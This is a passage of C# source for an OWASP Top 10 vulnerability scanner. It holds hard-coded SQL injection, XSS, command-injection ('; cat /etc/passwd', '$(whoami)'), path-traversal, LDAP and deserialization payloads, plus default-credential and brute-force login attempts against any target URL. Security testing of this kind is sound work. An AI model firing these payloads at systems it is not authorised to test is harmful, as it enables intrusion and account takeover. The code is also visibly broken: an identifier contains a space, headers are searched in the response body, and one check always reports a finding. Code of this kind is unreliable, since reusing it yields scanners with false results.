using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Comprehensive OWASP Top 10 2025 Vulnerability Scanner
    /// Automatically tests all entered/crawled URLs for all 10 OWASP categories
    /// </summary>
    public class OWASPT10_2025_ScannerService
    {
        private readonly HttpClient _httpClient;
        private Dictionary<string, OWASPT10ScanReport> _scanResults;
        private bool _isEnabled;

        public event EventHandler<OWASPT10ScanProgressEventArgs> ScanProgress;
        public event EventHandler<OWASPT10VulnerabilityFoundEventArgs> VulnerabilityFound;

        public bool IsEnabled
        {
            get => _isEnabled;
            set => _isEnabled = value;
        }

        public OWASPT10_2025_ScannerService()
        {
            _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
            _scanResults = new Dictionary<string, OWASPT10ScanReport>();
            _isEnabled = false;
        }

        public async Task<OWASPT10ScanReport> ScanUrl(string url, TrafficEntry originalEntry = null)
        {
            var report = new OWASPT10ScanReport
            {
                Url = url,
                StartTime = DateTime.Now,
                OriginalRequest = originalEntry?.RawRequest,
                OriginalResponse = originalEntry?.RawResponse
            };

            OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Starting OWASP Top 10 2025 scan..." });

            try
            {
                // A01:2025 - Broken Access Control
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A01: Broken Access Control..." });
                var a01Results = await TestBrokenAccessControl(url, originalEntry);
                report.VulnerabilitiesByCategory["A01:2025 - Broken Access Control"] = a01Results;

                // A02:2025 - Security Misconfiguration
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A02: Security Misconfiguration..." });
                var a02Results = await TestSecurityMisconfiguration(url, originalEntry);
                report.VulnerabilitiesByCategory["A02:2025 - Security Misconfiguration"] = a02Results;

                // A03:2025 - Software Supply Chain Failures
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A03: Software Supply Chain Failures..." });
                var a03Results = await TestSupplyChainFailures(url, originalEntry);
                report.VulnerabilitiesByCategory["A03:2025 - Software Supply Chain Failures"] = a03Results;

                // A04:2025 - Cryptographic Failures
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A04: Cryptographic Failures..." });
                var a04Results = await TestCryptographicFailures(url, originalEntry);
                report.VulnerabilitiesByCategory["A04:2025 - Cryptographic Failures"] = a04Results;

                // A05:2025 - Injection
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A05: Injection..." });
                var a05Results = await TestInjection(url, originalEntry);
                report.VulnerabilitiesByCategory["A05:2025 - Injection"] = a05Results;

                // A06:2025 - Insecure Design
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A06: Insecure Design..." });
                var a06Results = await TestInsecureDesign(url, originalEntry);
                report.VulnerabilitiesByCategory["A06:2025 - Insecure Design"] = a06Results;

                // A07:2025 - Authentication Failures
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A07: Authentication Failures..." });
                var a07Results = await TestAuthenticationFailures(url, originalEntry);
                report.VulnerabilitiesByCategory["A07:2025 - Authentication Failures"] = a07Results;

                // A08:2025 - Software or Data Integrity Failures
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A08: Data Integrity Failures..." });
                var a08Results = await TestIntegrityFailures(url, originalEntry);
                report.VulnerabilitiesByCategory["A08:2025 - Software or Data Integrity Failures"] = a08Results;

                // A09:2025 - Logging & Alerting Failures
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A09: Logging & Alerting Failures..." });
                var a09Results = await TestLoggingFailures(url, originalEntry);
                report.VulnerabilitiesByCategory["A09:2025 - Logging & Alerting Failures"] = a09Results;

                // A10:2025 - Mishandling of Exceptional Conditions
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A10: Exceptional Conditions..." });
                var a10Results = await TestExceptionalConditions(url, originalEntry);
                report.VulnerabilitiesByCategory["A10:2025 - Mishandling of Exceptional Conditions"] = a10Results;

                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.TotalVulnerabilitiesFound = report.VulnerabilitiesByCategory.Values.Sum(v => v.Count);

                _scanResults[url] = report;
                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = $"Scan complete! Found {report.TotalVulnerabilitiesFound} vulnerability(ies)" });
            }
            catch (Exception ex)
            {
                report.Error = ex.Message;
                report.EndTime = DateTime.Now;
            }

            return report;
        }

        #region A01: Broken Access Control

        private async Task<List<OWASPT10Vulnerability>> TestBrokenAccessControl(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: IDOR - Try accessing resources with different IDs
                var idorTests = new[]
                {
                    ("id", new[] { "1", "2", "100", "999", "admin", "../1" }),
                    ("user_id", new[] { "1", "2", "admin" }),
                    ("account", new[] { "1", "2" }),
                    ("file", new[] { "../etc/passwd", "../../config", "admin.txt" })
                };

                foreach (var (param, testValues) in idorTests)
                {
                    foreach (var testValue in testValues)
                    {
                        var testUrl = AddOrModifyParameter(url, param, testValue);
                        var result = await TestRequest(testUrl, "GET");

                        if (result.IsSuccessful && result.Response.Contains("success", StringComparison.OrdinalIgnoreCase))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A01:2025 - Broken Access Control",
                                Type = "Insecure Direct Object Reference (IDOR)",
                                Severity = "High",
                                Description = $"Application allows access to unauthorized resources by manipulating the '{param}' parameter",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = $"Successfully accessed resource with {param}={testValue}",
                                PoC = GenerateIDORPoC(url, param, testValue, result.Response),
                                CWE = "CWE-639"
                            });
                        }
                    }
                }

                // Test 2: Missing Function Level Access Control
                var adminPaths = new[] { "/admin", "/administrator", "/manage", "/dashboard", "/panel", "/api/admin", "/admin.php", "/wp-admin" };
                foreach (var adminPath in adminPaths)
                {
                    var testUrl = GetBaseUrl(url) + adminPath;
                    var result = await TestRequest(testUrl, "GET");

                    if (result.StatusCode == 200 && !result.Response.Contains("login", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A01:2025 - Broken Access Control",
                            Type = "Missing Function Level Access Control",
                            Severity = "Critical",
                            Description = $"Administrative interface accessible without authentication",
                            TestUrl = testUrl,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = $"Admin path '{adminPath}' returns 200 OK without authentication",
                            PoC = GenerateAccessControlPoC(testUrl, result.Response),
                            CWE = "CWE-284"
                        });
                    }
                }

                // Test 3: Path Traversal for Access Control Bypass
                var traversalPayloads = new[] { "..\\", "../", "....//", "..%2F", "%2e%2e%2f" };
                foreach (var payload in traversalPayloads)
                {
                    var testUrl = url + payload + "admin";
                    var result = await TestRequest(testUrl, "GET");

                    if (result.IsSuccessful && result.Response.Contains("admin", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A01:2025 - Broken Access Control",
                            Type = "Path Traversal Access Control Bypass",
                            Severity = "High",
                            Description = "Access control can be bypassed using path traversal",
                            TestUrl = testUrl,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = $"Path traversal '{payload}' bypassed access control",
                            PoC = GeneratePathTraversalPoC(url, payload),
                            CWE = "CWE-22"
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Log error but continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A02: Security Misconfiguration

        private async Task<List<OWASPT10Vulnerability>> TestSecurityMisconfiguration(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                var result = await TestRequest(url, "GET");

                // Test 1: Missing Security Headers
                var requiredHeaders = new Dictionary<string, string>
                {
                    { "Strict-Transport-Security", "HSTS" },
                    { "X-Frame-Options", "Clickjacking Protection" },
                    { "X-Content-Type-Options", "MIME-Sniffing Protection" },
                    { "Content-Security-Policy", "CSP" },
                    { "X-XSS-Protection", "XSS Protection" }
                };

                foreach (var header in requiredHeaders)
                {
                    if (!result.Response.Contains(header.Key, StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A02:2025 - Security Misconfiguration",
                            Type = $"Missing Security Header: {header.Value}",
                            Severity = "Medium",
                            Description = $"Response missing '{header.Key}' security header",
                            TestUrl = url,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = $"Header '{header.Key}' not found in response",
                            PoC = GenerateSecurityHeaderPoC(header.Key, header.Value),
                            CWE = "CWE-16"
                        });
                    }
                }

                // Test 2: Verbose Error Messages
                var errorTests = new[] { url + "/nonexistent", url + "?error=test", url + "?debug=1" };
                foreach (var testUrl in errorTests)
                {
                    var errorResult = await TestRequest(testUrl, "GET");
                    if (errorResult.Response.Contains("Exception", StringComparison.OrdinalIgnoreCase) ||
                        errorResult.Response.Contains("Stack trace", StringComparison.OrdinalIgnoreCase) ||
                        errorResult.Response.Contains("SQL", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A02:2025 - Security Misconfiguration",
                            Type = "Verbose Error Messages",
                            Severity = "Medium",
                            Description = "Application exposes detailed error messages",
                            TestUrl = testUrl,
                            TestRequest = errorResult.Request,
                            TestResponse = errorResult.Response,
                            Evidence = "Detailed error information exposed in response",
                            PoC = GenerateVerboseErrorPoC(testUrl),
                            CWE = "CWE-209"
                        });
                    }
                }

                // Test 3: Directory Listing
                var baseUrl = GetBaseUrl(url);
                var directoryTests = new[] { "/uploads/", "/images/", "/files/", "/assets/", "/backup/" };
                foreach (var dir in directoryTests)
                {
                    var testUrl = baseUrl + dir;
                    var dirResult = await TestRequest(testUrl, "GET");
                    if (dirResult.Response.Contains("Index of", StringComparison.OrdinalIgnoreCase) ||
                        dirResult.Response.Contains("Directory listing", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A02:2025 - Security Misconfiguration",
                            Type = "Directory Listing Enabled",
                            Severity = "Low",
                            Description = $"Directory listing enabled for '{dir}'",
                            TestUrl = testUrl,
                            TestRequest = dirResult.Request,
                            TestResponse = dirResult.Response,
                            Evidence = "Directory contents exposed",
                            PoC = GenerateDirectoryListingPoC(testUrl),
                            CWE = "CWE-548"
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A03: Software Supply Chain Failures

        private async Task<List<OWASPT10Vulnerability>> TestSupplyChainFailures(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                var result = await TestRequest(url, "GET");

                // Test 1: Check for known vulnerable libraries
                var vulnerableLibraries = new Dictionary<string, string>
                {
                    { "jquery-1.", "jQuery 1.x (vulnerable to XSS)" },
                    { "jquery-2.", "jQuery 2.x (vulnerable versions)" },
                    { "angular.js", "AngularJS (template injection)" },
                    { "bootstrap-2.", "Bootstrap 2.x (XSS vulnerabilities)" },
                    { "moment-2.0", "Moment.js 2.0 (ReDoS)" }
                };

                foreach (var lib in vulnerableLibraries)
                {
                    if (result.Response.Contains(lib.Key, StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A03:2025 - Software Supply Chain Failures",
                            Type = "Vulnerable Component Detected",
                            Severity = "High",
                            Description = $"Application uses {lib.Value}",
                            TestUrl = url,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = $"Found reference to '{lib.Key}' in response",
                            PoC = GenerateVulnerableComponentPoC(lib.Key, lib.Value),
                            CWE = "CWE-1104"
                        });
                    }
                }

                // Test 2: Check for outdated/insecure CDN resources
                var cdnPatterns = new[] { "http://", "cdn.", "ajax.googleapis", "cdnjs", "unpkg" };
                foreach (var pattern in cdnPatterns)
                {
                    if (result.Response.Contains(pattern) && result.Response.Contains("http://", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A03:2025 - Software Supply Chain Failures",
                            Type = "Insecure CDN Resource",
                            Severity = "Medium",
                            Description = "Application loads resources over insecure HTTP from CDN",
                            TestUrl = url,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = $"HTTP CDN resource detected containing '{pattern}'",
                            PoC = GenerateCDNInsecurePoC(),
                            CWE = "CWE-829"
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A04: Cryptographic Failures

        private async Task<List<OWASPT10Vulnerability>> TestCryptographicFailures(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: HTTP instead of HTTPS
                if (url.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
                {
                    vulnerabilities.Add(new OWASPT10Vulnerability
                    {
                        Category = "A04:2025 - Cryptographic Failures",
                        Type = "Unencrypted Communication",
                        Severity = "High",
                        Description = "Application communicates over unencrypted HTTP",
                        TestUrl = url,
                        Evidence = "URL uses HTTP protocol",
                        PoC = GenerateHTTPPoC(url),
                        CWE = "CWE-319"
                    });
                }

                var result = await TestRequest(url, "GET");

                // Test 2: Sensitive data in URL
                var sensitivePatterns = new[] { "password=", "pwd=", "pass=", "token=", "api_key=", "secret=", "ssn=", "credit_card=" };
                foreach (var pattern in sensitivePatterns)
                {
                    if (url.Contains(pattern, StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A04:2025 - Cryptographic Failures",
                            Type = "Sensitive Data in URL",
                            Severity = "Critical",
                            Description = $"Sensitive data ({pattern}) exposed in URL",
                            TestUrl = url,
                            Evidence = $"URL contains sensitive parameter '{pattern}'",
                            PoC = GenerateSensitiveDataPoC(url, pattern),
                            CWE = "CWE-598"
                        });
                    }
                }

                // Test 3: Weak encryption indicators
                if (result.Response.Contains("MD5", StringComparison.OrdinalIgnoreCase) ||
                    result.Response.Contains("SHA1", StringComparison.OrdinalIgnoreCase) ||
                    result.Response.Contains("DES", StringComparison.OrdinalIgnoreCase))
                {
                    vulnerabilities.Add(new OWASPT10Vulnerability
                    {
                        Category = "A04:2025 - Cryptographic Failures",
                        Type = "Weak Cryptographic Algorithm",
                        Severity = "High",
                        Description = "Application uses weak cryptographic algorithms (MD5/SHA1/DES)",
                        TestUrl = url,
                        TestRequest = result.Request,
                        TestResponse = result.Response,
                        Evidence = "Weak algorithm reference detected in response",
                        PoC = GenerateWeakCryptoPoC(),
                        CWE = "CWE-327"
                    });
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A05: Injection

        private async Task<List<OWASPT10Vulnerability>> TestInjection(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // SQL Injection payloads
                var sqlPayloads = new[]
                {
                    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "' AND 1=2--",
                    "admin'--", "1' ORDER BY 1--", "' OR 'a'='a", "1' AND '1'='2"
                };

                // XSS payloads
                var xssPayloads = new[]
                {
                    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>", "javascript:alert('XSS')",
                    "'\"><script>alert(1)</script>"
                };

                // Command Injection payloads
                var cmdPayloads = new[]
                {
                    "; ls", "| whoami", "& dir", "; cat /etc/passwd",
                    "$(whoami)", "`id`", "; ping -c 1 127.0.0.1"
                };

                // LDAP Injection payloads
                var ldapPayloads = new[]
                {
                    "*", "*)(&", "*)(uid=*", "admin*", "*))(|(uid=*"
                };

                // Extract parameters from URL
                var parameters = ExtractParameters(url);

                // Test SQL Injection
                foreach (var param in parameters)
                {
                    foreach (var payload in sqlPayloads)
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequest(testUrl, "GET");

                        if (IsSQL InjectionVulnerable(result.Response))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "SQL Injection",
                                Severity = "Critical",
                                Description = $"SQL Injection vulnerability in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = $"SQL error or unexpected behavior with payload: {payload}",
                                PoC = GenerateSQLInjectionPoC(url, param, payload, result.Response),
                                CWE = "CWE-89"
                            });
                            break; // Found vulnerability for this parameter
                        }
                    }
                }

                // Test XSS
                foreach (var param in parameters)
                {
                    foreach (var payload in xssPayloads)
                    {
                        var testUrl = ReplaceParameter(url, param, HttpUtility.UrlEncode(payload));
                        var result = await TestRequest(testUrl, "GET");

                        if (result.Response.Contains(payload, StringComparison.Ordinal))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "Cross-Site Scripting (XSS)",
                                Severity = "High",
                                Description = $"XSS vulnerability in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = $"Payload reflected without sanitization: {payload}",
                                PoC = GenerateXSSPoC(url, param, payload),
                                CWE = "CWE-79"
                            });
                            break;
                        }
                    }
                }

                // Test Command Injection
                foreach (var param in parameters)
                {
                    foreach (var payload in cmdPayloads)
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequest(testUrl, "GET");

                        if (IsCommandInjectionVulnerable(result.Response))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "Command Injection",
                                Severity = "Critical",
                                Description = $"Command Injection vulnerability in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = $"Command execution detected with payload: {payload}",
                                PoC = GenerateCommandInjectionPoC(url, param, payload),
                                CWE = "CWE-78"
                            });
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A06: Insecure Design

        private async Task<List<OWASPT10Vulnerability>> TestInsecureDesign(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: Rate Limiting
                var rateLimitTests = 10;
                var successfulRequests = 0;

                for (int i = 0; i < rateLimitTests; i++)
                {
                    var result = await TestRequest(url, "GET");
                    if (result.IsSuccessful)
                        successfulRequests++;
                }

                if (successfulRequests == rateLimitTests)
                {
                    vulnerabilities.Add(new OWASPT10Vulnerability
                    {
                        Category = "A06:2025 - Insecure Design",
                        Type = "Missing Rate Limiting",
                        Severity = "Medium",
                        Description = "Application does not implement rate limiting",
                        TestUrl = url,
                        Evidence = $"Successfully made {rateLimitTests} requests without throttling",
                        PoC = GenerateRateLimitPoC(url),
                        CWE = "CWE-770"
                    });
                }

                // Test 2: Business Logic Issues - Negative values
                var parameters = ExtractParameters(url);
                foreach (var param in parameters)
                {
                    if (param.ToLower().Contains("price") || param.ToLower().Contains("amount") || param.ToLower().Contains("quantity"))
                    {
                        var testUrl = ReplaceParameter(url, param, "-1");
                        var result = await TestRequest(testUrl, "GET");

                        if (result.IsSuccessful && !result.Response.Contains("error", StringComparison.OrdinalIgnoreCase))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A06:2025 - Insecure Design",
                                Type = "Business Logic Flaw - Negative Values",
                                Severity = "High",
                                Description = $"Application accepts negative values for '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = "Negative value accepted without validation",
                                PoC = GenerateBusinessLogicPoC(url, param),
                                CWE = "CWE-840"
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A07: Authentication Failures

        private async Task<List<OWASPT10Vulnerability>> TestAuthenticationFailures(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: Weak Credentials
                var weakCreds = new[]
                {
                    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                    ("administrator", "administrator"), ("root", "root"), ("test", "test")
                };

                foreach (var (username, password) in weakCreds)
                {
                    var loginUrl = FindLoginEndpoint(url);
                    if (loginUrl != null)
                    {
                        var result = await TestLogin(loginUrl, username, password);
                        if (result.IsSuccessful && IsLoginSuccessful(result.Response))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A07:2025 - Authentication Failures",
                                Type = "Weak Default Credentials",
                                Severity = "Critical",
                                Description = $"Default credentials work: {username}/{password}",
                                TestUrl = loginUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response,
                                Evidence = $"Successfully logged in with {username}/{password}",
                                PoC = GenerateWeakCredentialsPoC(loginUrl, username, password),
                                CWE = "CWE-798"
                            });
                            break;
                        }
                    }
                }

                // Test 2: Session Management - Session Fixation
                var result1 = await TestRequest(url, "GET");
                var sessionId1 = ExtractSessionId(result1.Response);

                if (!string.IsNullOrEmpty(sessionId1))
                {
                    var result2 = await TestRequestWithSession(url, "GET", sessionId1);
                    if (result2.IsSuccessful && ExtractSessionId(result2.Response) == sessionId1)
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A07:2025 - Authentication Failures",
                            Type = "Session Fixation",
                            Severity = "High",
                            Description = "Application doesn't regenerate session ID after authentication",
                            TestUrl = url,
                            Evidence = "Session ID remains unchanged after operations",
                            PoC = GenerateSessionFixationPoC(url, sessionId1),
                            CWE = "CWE-384"
                        });
                    }
                }

                // Test 3: Brute Force Protection
                var loginAttempts = 5;
                var loginUrl2 = FindLoginEndpoint(url);
                if (loginUrl2 != null)
                {
                    for (int i = 0; i < loginAttempts; i++)
                    {
                        await TestLogin(loginUrl2, "testuser", $"wrongpass{i}");
                    }

                    var finalAttempt = await TestLogin(loginUrl2, "testuser", "wrongpass");
                    if (finalAttempt.StatusCode != 429 && !finalAttempt.Response.Contains("locked", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A07:2025 - Authentication Failures",
                            Type = "Missing Brute Force Protection",
                            Severity = "Medium",
                            Description = "Application allows unlimited login attempts",
                            TestUrl = loginUrl2,
                            Evidence = $"Made {loginAttempts} failed login attempts without lockout",
                            PoC = GenerateBruteForcePoC(loginUrl2),
                            CWE = "CWE-307"
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A08: Software or Data Integrity Failures

        private async Task<List<OWASPT10Vulnerability>> TestIntegrityFailures(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                var result = await TestRequest(url, "GET");

                // Test 1: Missing Subresource Integrity (SRI)
                if (result.Response.Contains("<script src=\"http", StringComparison.OrdinalIgnoreCase) ||
                    result.Response.Contains("<link", StringComparison.OrdinalIgnoreCase))
                {
                    if (!result.Response.Contains("integrity=", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A08:2025 - Software or Data Integrity Failures",
                            Type = "Missing Subresource Integrity (SRI)",
                            Severity = "Medium",
                            Description = "External resources loaded without integrity checks",
                            TestUrl = url,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = "Script/link tags without 'integrity' attribute",
                            PoC = GenerateSRIPoC(),
                            CWE = "CWE-353"
                        });
                    }
                }

                // Test 2: Insecure Deserialization
                var deserializationTests = new[] { url + "?data=O:8:\"stdClass\"", url + "?obj=rO0ABXNyAA" };
                foreach (var testUrl in deserializationTests)
                {
                    var testResult = await TestRequest(testUrl, "GET");
                    if (testResult.Response.Contains("unserialize", StringComparison.OrdinalIgnoreCase) ||
                        testResult.Response.Contains("ObjectInputStream", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A08:2025 - Software or Data Integrity Failures",
                            Type = "Insecure Deserialization",
                            Severity = "Critical",
                            Description = "Application deserializes untrusted data",
                            TestUrl = testUrl,
                            TestRequest = testResult.Request,
                            TestResponse = testResult.Response,
                            Evidence = "Deserialization indicators found in response",
                            PoC = GenerateDeserializationPoC(testUrl),
                            CWE = "CWE-502"
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A09: Logging & Alerting Failures

        private async Task<List<OWASPT10Vulnerability>> TestLoggingFailures(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: Missing Security Logging
                var maliciousRequests = new[]
                {
                    url + "?id=1' OR '1'='1",
                    url + "?user=<script>alert(1)</script>",
                    url + "/../../../etc/passwd"
                };

                foreach (var testUrl in maliciousRequests)
                {
                    var result = await TestRequest(testUrl, "GET");
                    // If we got a response, the request was processed
                    // In a real scenario, we'd check if it was logged
                }

                vulnerabilities.Add(new OWASPT10Vulnerability
                {
                    Category = "A09:2025 - Logging & Alerting Failures",
                    Type = "Insufficient Security Event Logging",
                    Severity = "Low",
                    Description = "Unable to verify if security events are logged",
                    TestUrl = url,
                    Evidence = "Malicious requests processed without visible logging",
                    PoC = GenerateLoggingPoC(),
                    CWE = "CWE-778"
                });
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region A10: Mishandling of Exceptional Conditions

        private async Task<List<OWASPT10Vulnerability>> TestExceptionalConditions(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                // Test 1: Unhandled Exceptions
                var exceptionTests = new[]
                {
                    url + "?id=99999999999999999999",
                    url + "?page=-1",
                    url + "?limit=9999999",
                    url + "?data=" + new string('A', 10000)
                };

                foreach (var testUrl in exceptionTests)
                {
                    var result = await TestRequest(testUrl, "GET");
                    if (result.StatusCode == 500 ||
                        result.Response.Contains("Exception", StringComparison.OrdinalIgnoreCase) ||
                        result.Response.Contains("Error", StringComparison.OrdinalIgnoreCase) ||
                        result.Response.Contains("Stack trace", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A10:2025 - Mishandling of Exceptional Conditions",
                            Type = "Unhandled Exception",
                            Severity = "Medium",
                            Description = "Application exposes unhandled exceptions",
                            TestUrl = testUrl,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = "Server returned 500 error or exception details",
                            PoC = GenerateExceptionHandlingPoC(testUrl),
                            CWE = "CWE-755"
                        });
                        break;
                    }
                }

                // Test 2: Null Pointer/Reference Exceptions
                var nullTests = new[]
                {
                    url + "?id=null",
                    url + "?user=",
                    url + "?data="
                };

                foreach (var testUrl in nullTests)
                {
                    var result = await TestRequest(testUrl, "GET");
                    if (result.Response.Contains("NullPointerException", StringComparison.OrdinalIgnoreCase) ||
                        result.Response.Contains("NullReferenceException", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A10:2025 - Mishandling of Exceptional Conditions",
                            Type = "Null Reference Exception",
                            Severity = "Low",
                            Description = "Application fails to handle null values properly",
                            TestUrl = testUrl,
                            TestRequest = result.Request,
                            TestResponse = result.Response,
                            Evidence = "Null reference exception exposed",
                            PoC = GenerateNullExceptionPoC(testUrl),
                            CWE = "CWE-476"
                        });
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                // Continue scanning
            }

            return vulnerabilities;
        }

        #endregion

        #region Helper Methods

        private async Task<TestResult> TestRequest(string url, string method)
        {
            var result = new TestResult { Url = url };

            try
            {
                HttpResponseMessage response;
                if (method == "POST")
                    response = await _httpClient.PostAsync(url, null);
                else
                    response = await _httpClient.GetAsync(url);

                result.StatusCode = (int)response.StatusCode;
                result.IsSuccessful = response.IsSuccessStatusCode;
                result.Response = await response.Content.ReadAsStringAsync();
                result.Request = $"{method} {url}\r\n{response.RequestMessage?.Headers}";
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }

            return result;
        }

        private async Task<TestResult> TestLogin(string url, string username, string password)
        {
            var content = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("username", username),
                new KeyValuePair<string, string>("password", password)
            });

            var result = new TestResult { Url = url };
            try
            {
                var response = await _httpClient.PostAsync(url, content);
                result.StatusCode = (int)response.StatusCode;
                result.IsSuccessful = response.IsSuccessStatusCode;
                result.Response = await response.Content.ReadAsStringAsync();
                result.Request = $"POST {url}\r\nContent: username={username}&password=***";
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }

            return result;
        }

        private async Task<TestResult> TestRequestWithSession(string url, string method, string sessionId)
        {
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            request.Headers.Add("Cookie", $"session={sessionId}; PHPSESSID={sessionId}");

            var result = new TestResult { Url = url };
            try
            {
                var response = await _httpClient.SendAsync(request);
                result.StatusCode = (int)response.StatusCode;
                result.IsSuccessful = response.IsSuccessStatusCode;
                result.Response = await response.Content.ReadAsStringAsync();
                result.Request = $"{method} {url}\r\nCookie: session={sessionId}";
